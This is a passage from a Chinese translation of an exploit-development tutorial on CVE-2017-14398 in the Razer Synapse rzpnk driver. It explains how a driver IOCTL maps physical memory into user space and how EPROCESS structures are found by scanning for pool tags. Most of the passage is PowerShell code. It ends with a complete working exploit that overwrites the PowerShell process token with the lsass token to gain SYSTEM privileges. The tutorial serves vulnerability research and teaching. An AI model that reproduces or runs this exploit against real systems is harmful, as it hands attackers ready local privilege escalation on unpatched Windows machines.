        echo "`n[!] Unable to get driver handle..`n"
        Return
    } else {
        echo "`n[>] Driver access OK.."
        echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
        echo "[+] Handle: $hDevice"
    }
     
    #----------------[Prepare buffer & Send IOCTL]
     
    # Get full access process handle to self
    echo "`n[>] Opening full access handle to PowerShell.."
    $hPoshProc = [Razer]::OpenProcess(0x001F0FFF,$false,$PID)
    echo "[+] PowerShell handle: $hPoshProc"
     
    # Get Section handle
    echo "`n[>] Leaking Kernel handle to \Device\PhysicalMemory.."
    $SystemProcHandles = Get-Handles -ProcID 4
    [Int]$UserSectionHandle = $(($SystemProcHandles |Where-Object {$_.ObjectType -eq "Section"}).Handle)
    [Int64]$SystemSectionHandle = $UserSectionHandle + 0xffffffff80000000
    echo "[+] System section handle: $('{0:X}' -f $SystemSectionHandle)"
     
    # NTSTATUS ZwMapViewOfSection(
    #   _In_        HANDLE          SectionHandle,      | Param 3 - RCX = SectionHandle
    #   _In_        HANDLE          ProcessHandle,      | Param 1 - RDX = ProcessHandle
    #   _Inout_     PVOID           *BaseAddress,       | Param 2 - R8  = BaseAddress -> Irrelevant, ptr to NULL
    #   _In_        ULONG_PTR       ZeroBits,           | 0 -> OK - R9
    #   _In_        SIZE_T          CommitSize,         | Param 5 - CommitSize / ViewSize
    #   _Inout_opt_ PLARGE_INTEGER  SectionOffset,      | 0 -> OK
    #   _Inout_     PSIZE_T         ViewSize,           | Param 5 - CommitSize / ViewSize
    #   _In_        SECTION_INHERIT InheritDisposition, | 2 = ViewUnmap
    #   _In_        ULONG           AllocationType,     | 0 -> Undocumented?
    #   _In_        ULONG           Win32Protect        | 0x40 -> PAGE_READWRITE
    # );
    $InBuffer = @(
        [System.BitConverter]::GetBytes($hPoshProc.ToInt64()) +      # Param 1 - RDX=ProcessHandle
        [System.BitConverter]::GetBytes([Int64]0x0) +                # Param 2 - BaseAddress -> Irrelevant, ptr to NULL
        [System.BitConverter]::GetBytes($SystemSectionHandle) +      # Param 3 - RCX=SectionHandle
        [System.BitConverter]::GetBytes([Int64]4) +                  # Param 4 - ? junk ?
        [System.BitConverter]::GetBytes([Int64]$(1*1024*1024)) +     # Param 5 - CommitSize / ViewSize (1mb)
        [System.BitConverter]::GetBytes([Int64]4)                    # Param 6 - ? junk ?
    )
     
    # Output buffer
    $OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
     
    # Ptr receiving output byte count
    $IntRet = 0
     
    #=======
    # 0x22a050 - ZwOpenProcess
    # 0x22A064 - ZwMapViewOfSection
    #=======
    $CallResult = [Razer]::DeviceIoControl($hDevice, 0x22A064, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
    if (!$CallResult) {
        echo "`n[!] DeviceIoControl failed..`n"
        Return
    }
     
    #----------------[Read out the result buffer]
    echo "`n[>] Verifying ZwMapViewOfSection.."
    $NTSTATUS = "{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8+8))
    $Address = [System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8)
    if ($NTSTATUS -eq 0) {
        echo "[+] NTSTATUS Success!"
        echo "[+] 1mb RWX \Device\PhysicalMemory allocated at: $('{0:X}' -f $Address)`n"
    } else {
        echo "[!] Call failed: $('{0:X}' -f $NTSTATUS)`n"
    }
}
```

运行POC，得到下列输出。

![](/images/exploit/fuzzySecurity/20180316_22.jpg)

注意到我们通过阅读NTSTATUS码来丈量是否成功，Int64值此前是0，而这一次它是一个地址，表示我们本地进程中区段的映射位置。在Process Hacker中可以看到确实分配了一个严格大小的1024kb的内存块。

![](/images/exploit/fuzzySecurity/20180316_23.jpg)

使用Process Hacker，我们实际上可以转储这块内存到磁盘上。如果我们那样做的话，就可以看到下面一些有趣的内容。Bootkit？

![](/images/exploit/fuzzySecurity/20180316_24.jpg)

我们已证实了这个漏洞，但我们要如何去获取一个SYSTEM shell呢？

**Hunting EPROCESS**

最直接的办法就是通过写一个经典的token窃取exp。困难在于要在我们映射的内存中查找EPROCESS结构体。WinDBG中显示EPROCESS结构体被分配在一个标签为'Proc'的池块上。

![](/images/exploit/fuzzySecurity/20180316_25.jpg)

EPROCESS指针减去'Proc'池块首，我们可以立即算出头部尺寸。相反的，如果我们有了一个任意'Proc'池地址的话，我们也可以计算出EPROCESS结构的任意属性的位置。

![](/images/exploit/fuzzySecurity/20180316_26.jpg)

如果你想查找这些依赖于架构/版本的偏移字段而不想利用KD的话，你可以看看 [Terminus Project](http://terminus.rewolf.pl/terminus/)。这是 [@rwfpl](https://twitter.com/rwfpl) 所分享的很帮的资源，它会在很多情景下节省你大量的时间。

所以我们就把问题简化到寻找'Proc'池块上，现在还没通关。为了找到这些块我们可以扫描整个内存映射区段来查找这个特殊的'Proc'池标签。

![](/images/exploit/fuzzySecurity/20180316_27.jpg)

因为优化的原因，我们注意到池块都以0x10对齐。本质上，这意味着我们只需要以16字节作为单位进行读取。这可能没什么但却节省了宝贵的时间。即使如此，这个搜索也是非常之缓慢，毕竟'Proc'池块标签在900mb之后就开始存在了。我们可以通过扫描0x30000000(0x30000000/(1024*1024)=768mb)起始的映射内存来进一步的优化搜索过程，对不同OS版本来说，这个数可能会变化。

为了验证我们的理论，我们可以用下面的循环（在1.2gb映射区段）来查找'Proc'池块并转储一些EPROCESS数据来验证。

```powershell
echo "`n[>] Parsing physical memory, coffee time..`n"
for ($i=0x30000000;$i -lt $(1200*1024*1024); $i+=0x10) {
     
    # Read potential pooltag
    $Val = [System.Runtime.InteropServices.Marshal]::ReadInt32($Address+$i+4)
     
    # If pooltag matches Proc, pull out details..
    if ($Val -eq 0xe36f7250) {
        echo "[+] w00t Proc chunk found!"
        $ProcessName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($Address+$i+0x60+0x2d8+8) # Not sure why +8 here?
        $Token = [System.Runtime.InteropServices.Marshal]::ReadInt64($Address+$i+0x60+0x208)
        $ProcID = [System.Runtime.InteropServices.Marshal]::ReadInt64($Address+$i+0x60+0x180)
        echo "[>] Address: $('{0:X}' -f $($Address+$i))"
        echo "[>] $ProcessName"
        echo "[>] $ProcID"
        echo "[>] Token: $('{0:X}' -f $Token)"
        echo "==========================================="
    }
}
```

一部分结果如下：

![](/images/exploit/fuzzySecurity/20180316_28.jpg)

如你所见，该实现体并不完美，某些映像的名称被截断了，且有着少量的检测完全没有显示EPROCESS结构体。幸运的是，我发现大部分进程都可以保证被正确的检测到（包括PowerShell/lsass）。

## 游戏结束

遗留问题就是去修改上面的循环，使得它记录下lsass进程的token以及PowerShell进程的token位置。一旦两个元素都找到了我们就可以简单的替换PowerShell的token来提权到SYSTEM！这可能需要一些实验，在8,8.1和10上进行exp将是一个较为直接的练习。唯一需要考虑的就是EPROCESS结构体的变化以及开发一种策略来处理System进程的多个区段句柄。最终的exp如下。

```powershell
function RZ-ZwMapViewOfSection {
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
     
    public static class Razer
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
            String lpFileName,
            UInt32 dwDesiredAccess,
            UInt32 dwShareMode,
            IntPtr lpSecurityAttributes,
            UInt32 dwCreationDisposition,
            UInt32 dwFlagsAndAttributes,
            IntPtr hTemplateFile);
     
        [DllImport("Kernel32.dll", SetLastError = true)]
        public static extern bool DeviceIoControl(
            IntPtr hDevice,
            int IoControlCode,
            byte[] InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            ref int pBytesReturned,
            IntPtr Overlapped);
     
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect);
     
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            UInt32 processAccess,
            bool bInheritHandle,
            int processId);
    }
"@
 
    #----------------[Helper Funcs]
    $CVE201714398 = @"
 
                    shhsddh 
          shhy      Mhsdms  
         mmyydN     hNh     
        hM syyMdds   smNy   
shyshy  Nd s sMshNs  yssmm      Razer Synapse EOP - CVE-2017-14398
 shhdh hNs   dNNNddmdsd yMs
    sddds   mhydNmddmdmddy
           dMdhy                            [by b33f -> @FuzzySec]
          dNsyyss           
          smmdddmmmddmh        
                   yhmh
                   hdd      
                    yd      
"@
 
    $CVE201714398
 
    #----------------[Helper Funcs]
    function Get-Handles {
    <#
    .SYNOPSIS
        Use NtQuerySystemInformation::SystemHandleInformation to get a list of
        open handles in the specified process, works on x32/x64.
        Notes:
     
        * For more robust coding I would recomend using @mattifestation's
        Get-NtSystemInformation.ps1 part of PowerShellArsenal.
     
    .DESCRIPTION
        Author: Ruben Boonen (@FuzzySec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .EXAMPLE
        C:\PS> $SystemProcHandles = Get-Handles -ProcID 4
        C:\PS> $Key = $SystemProcHandles |Where-Object {$_.ObjectType -eq "Key"}
        C:\PS> $Key |ft
     
        ObjectType AccessMask PID Handle HandleFlags KernelPointer
        ---------- ---------- --- ------ ----------- -------------
        Key        0x00000000   4 0x004C NONE        0xFFFFC9076FC29BC0
        Key        0x00020000   4 0x0054 NONE        0xFFFFC9076FCDA7F0
        Key        0x000F0000   4 0x0058 NONE        0xFFFFC9076FC39CE0
        Key        0x00000000   4 0x0090 NONE        0xFFFFC907700A6B40
        Key        0x00000000   4 0x0098 NONE        0xFFFFC90770029F70
        Key        0x00020000   4 0x00A0 NONE        0xFFFFC9076FC9C1A0
        [...Snip...]
    #>
     
        [CmdletBinding()]
        param (
            [Parameter(Mandatory = $True)]
            [int]$ProcID
        )
         
        Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Principal;
         
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct SYSTEM_HANDLE_INFORMATION
        {
            public UInt32 ProcessID;
            public Byte ObjectTypeNumber;
            public Byte Flags;
            public UInt16 HandleValue;
            public IntPtr Object_Pointer;
            public UInt32 GrantedAccess;
        }
         
        public static class GetHandles
        {
            [DllImport("ntdll.dll")]
            public static extern int NtQuerySystemInformation(
                int SystemInformationClass,
                IntPtr SystemInformation,
                int SystemInformationLength,
                ref int ReturnLength);
        }
"@
     
        # Make sure the PID exists
        if (!$(get-process -Id $ProcID -ErrorAction SilentlyContinue)) {
            Return
        }
     
        # Flag switches (0 = NONE?)
        $FlagSwitches = @{
            0 = 'NONE'
            1 = 'PROTECT_FROM_CLOSE'
            2 = 'INHERIT'
        }
         
        $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
        $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
        switch ($OSMajorMinor)
        {
            '10.0' # Windows 10 (Tested on v1511)
            {
                # Win 10 v1703
                if ($OSVersion.Build -ge 15063) {
                    $TypeSwitches = @{
                        0x24 = 'TmTm'; 0x18 = 'Desktop'; 0x7 = 'Process'; 0x2c = 'RegistryTransaction'; 0xe = 'DebugObject';
                        0x3d = 'VRegConfigurationContext'; 0x34 = 'DmaDomain'; 0x1c = 'TpWorkerFactory'; 0x1d = 'Adapter';
                        0x5 = 'Token'; 0x39 = 'DxgkSharedResource'; 0xc = 'PsSiloContextPaged'; 0x38 = 'NdisCmState';
                        0xb = 'ActivityReference'; 0x35 = 'PcwObject'; 0x2f = 'WmiGuid'; 0x33 = 'DmaAdapter';
                        0x30 = 'EtwRegistration'; 0x29 = 'Session'; 0x1a = 'RawInputManager'; 0x13 = 'Timer'; 0x10 = 'Mutant';
                        0x14 = 'IRTimer'; 0x3c = 'DxgkCurrentDxgProcessObject'; 0x21 = 'IoCompletion';
                        0x3a = 'DxgkSharedSyncObject'; 0x17 = 'WindowStation'; 0x15 = 'Profile'; 0x23 = 'File';
                        0x2a = 'Partition'; 0x12 = 'Semaphore'; 0xd = 'PsSiloContextNonPaged'; 0x32 = 'EtwConsumer';
                        0x19 = 'Composition'; 0x31 = 'EtwSessionDemuxEntry'; 0x1b = 'CoreMessaging'; 0x25 = 'TmTx';
                        0x4 = 'SymbolicLink'; 0x36 = 'FilterConnectionPort'; 0x2b = 'Key'; 0x16 = 'KeyedEvent';
                        0x11 = 'Callback'; 0x22 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job';
                        0x3b = 'DxgkSharedSwapChainObject'; 0x1e = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1f = 'Device';
                        0x3 = 'Directory'; 0x28 = 'Section'; 0x27 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type';
                        0x37 = 'FilterCommunicationPort'; 0x2e = 'PowerRequest'; 0x26 = 'TmRm'; 0xf = 'Event';
                        0x2d = 'ALPC Port'; 0x20 = 'Driver';
                    }
                }
                 
                # Win 10 v1607
                if ($OSVersion.Build -ge 14393 -And $OSVersion.Build -lt 15063) {
                    $TypeSwitches = @{
                        0x23 = 'TmTm'; 0x17 = 'Desktop'; 0x7 = 'Process'; 0x2b = 'RegistryTransaction'; 0xd = 'DebugObject';
                        0x3a = 'VRegConfigurationContext'; 0x32 = 'DmaDomain'; 0x1b = 'TpWorkerFactory'; 0x1c = 'Adapter';
                        0x5 = 'Token'; 0x37 = 'DxgkSharedResource'; 0xb = 'PsSiloContextPaged'; 0x36 = 'NdisCmState';
                        0x33 = 'PcwObject'; 0x2e = 'WmiGuid'; 0x31 = 'DmaAdapter'; 0x2f = 'EtwRegistration';
                        0x28 = 'Session'; 0x19 = 'RawInputManager'; 0x12 = 'Timer'; 0xf = 'Mutant'; 0x13 = 'IRTimer';
                        0x20 = 'IoCompletion'; 0x38 = 'DxgkSharedSyncObject'; 0x16 = 'WindowStation'; 0x14 = 'Profile';
                        0x22 = 'File'; 0x3b = 'VirtualKey'; 0x29 = 'Partition'; 0x11 = 'Semaphore'; 0xc = 'PsSiloContextNonPaged';
                        0x30 = 'EtwConsumer'; 0x18 = 'Composition'; 0x1a = 'CoreMessaging'; 0x24 = 'TmTx'; 0x4 = 'SymbolicLink';
                        0x34 = 'FilterConnectionPort'; 0x2a = 'Key'; 0x15 = 'KeyedEvent'; 0x10 = 'Callback';
                        0x21 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job'; 0x39 = 'DxgkSharedSwapChainObject';
                        0x1d = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1e = 'Device'; 0x3 = 'Directory'; 0x27 = 'Section';
                        0x26 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type'; 0x35 = 'FilterCommunicationPort'; 0x2d = 'PowerRequest';
                        0x25 = 'TmRm'; 0xe = 'Event'; 0x2c = 'ALPC Port'; 0x1f = 'Driver';
                    }
                }
                 
                # Win 10 v1511
                if ($OSVersion.Build -lt 14393) {
                    $TypeSwitches = @{
                        0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
                        0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
                        0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'Mutant'; 0x0E = 'Callback'; 0x0F = 'Semaphore';
                        0x10 = 'Timer'; 0x11 = 'IRTimer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
                        0x15 = 'Desktop'; 0x16 = 'Composition'; 0x17 = 'RawInputManager'; 0x18 = 'TpWorkerFactory';
                        0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
                        0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
                        0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Partition'; 0x27 = 'Key';
                        0x28 = 'ALPC Port'; 0x29 = 'PowerRequest'; 0x2A = 'WmiGuid'; 0x2B = 'EtwRegistration';
                        0x2C = 'EtwConsumer'; 0x2D = 'DmaAdapter'; 0x2E = 'DmaDomain'; 0x2F = 'PcwObject';
                        0x30 = 'FilterConnectionPort'; 0x31 = 'FilterCommunicationPort'; 0x32 = 'NetworkNamespace';
                        0x33 = 'DxgkSharedResource'; 0x34 = 'DxgkSharedSyncObject'; 0x35 = 'DxgkSharedSwapChainObject';
                    }
                }
            }
             
            '6.2' # Windows 8 and Windows Server 2012
            {
                $TypeSwitches = @{
                    0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
                    0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
                    0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'EventPair'; 0x0E = 'Mutant'; 0x0F = 'Callback';
                    0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'IRTimer'; 0x13 = 'Profile'; 0x14 = 'KeyedEvent';
                    0x15 = 'WindowStation'; 0x16 = 'Desktop'; 0x17 = 'CompositionSurface'; 0x18 = 'TpWorkerFactory';
                    0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
                    0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
                    0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Key'; 0x27 = 'ALPC Port';
                    0x28 = 'PowerRequest'; 0x29 = 'WmiGuid'; 0x2A = 'EtwRegistration'; 0x2B = 'EtwConsumer';
                    0x2C = 'FilterConnectionPort'; 0x2D = 'FilterCommunicationPort'; 0x2E = 'PcwObject';
                    0x2F = 'DxgkSharedResource'; 0x30 = 'DxgkSharedSyncObject';
                }
            }
         
            '6.1' # Windows 7 and Window Server 2008 R2
            {
                $TypeSwitches = @{
                    0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
                    0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0a = 'IoCompletionReserve';
                    0x0b = 'DebugObject'; 0x0c = 'Event'; 0x0d = 'EventPair'; 0x0e = 'Mutant'; 0x0f = 'Callback';
                    0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
                    0x15 = 'Desktop'; 0x16 = 'TpWorkerFactory'; 0x17 = 'Adapter'; 0x18 = 'Controller';
                    0x19 = 'Device'; 0x1a = 'Driver'; 0x1b = 'IoCompletion'; 0x1c = 'File'; 0x1d = 'TmTm';
                    0x1e = 'TmTx'; 0x1f = 'TmRm'; 0x20 = 'TmEn'; 0x21 = 'Section'; 0x22 = 'Session'; 0x23 = 'Key';
                    0x24 = 'ALPC Port'; 0x25 = 'PowerRequest'; 0x26 = 'WmiGuid'; 0x27 = 'EtwRegistration';
                    0x28 = 'EtwConsumer'; 0x29 = 'FilterConnectionPort'; 0x2a = 'FilterCommunicationPort';
                    0x2b = 'PcwObject';
                }
            }
         
            '6.0' # Windows Vista and Windows Server 2008
            {
                $TypeSwitches = @{
                    0x01 = 'Type'; 0x02 = 'Directory'; 0x03 = 'SymbolicLink'; 0x04 = 'Token'; 0x05 = 'Job';
                    0x06 = 'Process'; 0x07 = 'Thread'; 0x08 = 'DebugObject'; 0x09 = 'Event'; 0x0a = 'EventPair';
                    0x0b = 'Mutant'; 0x0c = 'Callback'; 0x0d = 'Semaphore'; 0x0e = 'Timer'; 0x0f = 'Profile';
                    0x10 = 'KeyedEvent'; 0x11 = 'WindowStation'; 0x12 = 'Desktop'; 0x13 = 'TpWorkerFactory';
                    0x14 = 'Adapter'; 0x15 = 'Controller'; 0x16 = 'Device'; 0x17 = 'Driver'; 0x18 = 'IoCompletion';
                    0x19 = 'File'; 0x1a = 'TmTm'; 0x1b = 'TmTx'; 0x1c = 'TmRm'; 0x1d = 'TmEn'; 0x1e = 'Section';
                    0x1f = 'Session'; 0x20 = 'Key'; 0x21 = 'ALPC Port'; 0x22 = 'WmiGuid'; 0x23 = 'EtwRegistration';
                    0x24 = 'FilterConnectionPort'; 0x25 = 'FilterCommunicationPort';
                }
            }
        }
     
        [int]$BuffPtr_Size = 0
        while ($true) {
            [IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
            $SystemInformationLength = New-Object Int
         
            $CallResult = [GetHandles]::NtQuerySystemInformation(16, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
             
            # STATUS_INFO_LENGTH_MISMATCH
            if ($CallResult -eq 0xC0000004) {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
                [int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
            }
            # STATUS_SUCCESS
            elseif ($CallResult -eq 0x00000000) {
                break
            }
            # Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
            else {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
                return
            }
        }
         
        $SYSTEM_HANDLE_INFORMATION = New-Object SYSTEM_HANDLE_INFORMATION
        $SYSTEM_HANDLE_INFORMATION = $SYSTEM_HANDLE_INFORMATION.GetType()
        if ([System.IntPtr]::Size -eq 4) {
            $SYSTEM_HANDLE_INFORMATION_Size = 16 # This makes sense!
        } else {
            $SYSTEM_HANDLE_INFORMATION_Size = 24 # This doesn't make sense, should be 20 on x64 but that doesn't work.
                                                # Ask no questions, hear no lies!
        }
         
        $BuffOffset = $BuffPtr.ToInt64()
        $HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
        $BuffOffset = $BuffOffset + [System.IntPtr]::Size
         
        $SystemHandleArray = @()
        for ($i=0; $i -lt $HandleCount; $i++){
            # PtrToStructure only objects we are targeting, this is expensive computation
            if ([System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset) -eq $ProcID) {
                $SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
                $Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_HANDLE_INFORMATION)
                 
                $HashTable = @{
                    PID = $Cast.ProcessID
                    ObjectType = if (!$($TypeSwitches[[int]$Cast.ObjectTypeNumber])) { "0x$('{0:X2}' -f [int]$Cast.ObjectTypeNumber)" } else { $TypeSwitches[[int]$Cast.ObjectTypeNumber] }
                    HandleFlags = $FlagSwitches[[int]$Cast.Flags]
                    Handle = "0x$('{0:X4}' -f [int]$Cast.HandleValue)"
                    KernelPointer = if ([System.IntPtr]::Size -eq 4) { "0x$('{0:X}' -f $Cast.Object_Pointer.ToInt32())" } else { "0x$('{0:X}' -f $Cast.Object_Pointer.ToInt64())" }
                    AccessMask = "0x$('{0:X8}' -f $($Cast.GrantedAccess -band 0xFFFF0000))"
                }
                 
                $Object = New-Object PSObject -Property $HashTable
                $SystemHandleArray += $Object
                 
            }
     
            $BuffOffset = $BuffOffset + $SYSTEM_HANDLE_INFORMATION_Size
        }
         
        if ($($SystemHandleArray.count) -eq 0) {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
            Return
        }
         
        # Set column order and auto size
        $SystemHandleArray
         
        # Free SYSTEM_HANDLE_INFORMATION array
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
    }
 
    #----------------[Get Driver Handle]
     
    $hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
    [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
     
    if ($hDevice -eq -1) {
        echo "`n[!] Unable to get driver handle..`n"
        Return
    } else {
        echo "`n[>] Driver access OK.."
        echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
        echo "[+] Handle: $hDevice"
    }
     
    #----------------[Prepare buffer & Send IOCTL]
     
    # Get full access process handle to self
    echo "`n[>] Opening full access handle to PowerShell.."
    $hPoshProc = [Razer]::OpenProcess(0x001F0FFF,$false,$PID)
    echo "[+] PowerShell handle: $hPoshProc"
     
    # Get Section handle
    echo "`n[>] Leaking Kernel handle to \Device\PhysicalMemory.."
    $SystemProcHandles = Get-Handles -ProcID 4
    [Int]$UserSectionHandle = $(($SystemProcHandles |Where-Object {$_.ObjectType -eq "Section"}).Handle)
    [Int64]$SystemSectionHandle = $UserSectionHandle + 0xffffffff80000000
    echo "[+] System section handle: $('{0:X}' -f $SystemSectionHandle)"
     
    # NTSTATUS ZwMapViewOfSection(
    #   _In_        HANDLE          SectionHandle,      | Param 3 - RCX = SectionHandle
    #   _In_        HANDLE          ProcessHandle,      | Param 1 - RDX = ProcessHandle
    #   _Inout_     PVOID           *BaseAddress,       | Param 2 - R8  = BaseAddress -> Irrelevant, ptr to NULL
    #   _In_        ULONG_PTR       ZeroBits,           | 0 -> OK - R9
    #   _In_        SIZE_T          CommitSize,         | Param 5 - CommitSize / ViewSize
    #   _Inout_opt_ PLARGE_INTEGER  SectionOffset,      | 0 -> OK
    #   _Inout_     PSIZE_T         ViewSize,           | Param 5 - CommitSize / ViewSize
    #   _In_        SECTION_INHERIT InheritDisposition, | 2 = ViewUnmap
    #   _In_        ULONG           AllocationType,     | 0 -> Undocumented?
    #   _In_        ULONG           Win32Protect        | 0x40 -> PAGE_READWRITE
    # );
    $InBuffer = @(
        [System.BitConverter]::GetBytes($hPoshProc.ToInt64()) +      # Param 1 - RDX=ProcessHandle
        [System.BitConverter]::GetBytes([Int64]0x0) +                # Param 2 - BaseAddress -> Irrelevant, ptr to NULL
        [System.BitConverter]::GetBytes($SystemSectionHandle) +      # Param 3 - RCX=SectionHandle
        [System.BitConverter]::GetBytes([Int64]4) +                  # Param 4 - ? junk ?
        [System.BitConverter]::GetBytes([Int64]$(1200*1024*1024)) +  # Param 5 - CommitSize / ViewSize
        [System.BitConverter]::GetBytes([Int64]4)                    # Param 6 - ? junk ?
    )
     
    # Output buffer
    $OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
     
    # Ptr receiving output byte count
    $IntRet = 0
     
    #=======
    # 0x22A064 - ZwMapViewOfSection
    #=======
    $CallResult = [Razer]::DeviceIoControl($hDevice, 0x22A064, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
    if (!$CallResult) {
        echo "`n[!] DeviceIoControl failed..`n"
        Return
    }
     
    #----------------[Read out the result buffer]
    echo "`n[>] Verifying ZwMapViewOfSection.."
    $NTSTATUS = "{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8+8))
    $Address = [System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8)
    if ($NTSTATUS -eq 0) {
        echo "[+] NTSTATUS Success!"
        echo "[+] 1.2GB RWX \Device\PhysicalMemory allocated at: $('{0:X}' -f $Address)"
    } else {
        echo "[!] Call failed: $('{0:X}' -f $NTSTATUS)"
    }
 
    #----------------[Parse PhysicalMemory]
    echo "`n[>] Parsing physical memory, coffee time..`n"
     
    # Store PwnCount so we can exit our loop!
    $PwnCount = 0
     
    for ($i=0x30000000;$i -lt $(1200*1024*1024); $i+=0x10) {
         
        # Read potential pooltag
        $Val = [System.Runtime.InteropServices.Marshal]::ReadInt32($Address+$i+4)
         
        # If pooltag matches Proc, pull out details..
        if ($Val -eq 0xe36f7250) {
         
            echo "[?] w00t Proc chunk found!"
            $ProcessName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($Address+$i+0x60+0x2d8+8) # Not sure why +8 here?
             
            if ($ProcessName -eq "powershell.exe") {
                $Token = [System.Runtime.InteropServices.Marshal]::ReadInt64($Address+$i+0x60+0x208)
                $WriteWhere = $Address+$i+0x60+0x208
                echo "`n[>] PowerShell poolparty: $('{0:X}' -f $($Address+$i))"
                echo "[+] Token: $('{0:X}' -f $Token)`n"
                $PwnCount += 1
            }
             
            if ($ProcessName -eq "lsass.exe") {
                $Token = [System.Runtime.InteropServices.Marshal]::ReadInt64($Address+$i+0x60+0x208)
                $WriteWhat = $Token
                echo "`n[>] LSASS poolparty: $('{0:X}' -f $($Address+$i))"
                echo "[+] Token: $('{0:X}' -f $Token)`n"
                $PwnCount += 1
            }
             
            # Check if PwnCount is 2
            if ($PwnCount -eq 2) {
                # Overwrite PowerShell token & exit
                echo "[>] Duplicating SYSTEM token..`n"
                [System.Runtime.InteropServices.Marshal]::WriteInt64($WriteWhere,$WriteWhat)
                Break
            }
        }
    }
}
```

![](/images/exploit/fuzzySecurity/20180316_29.jpg)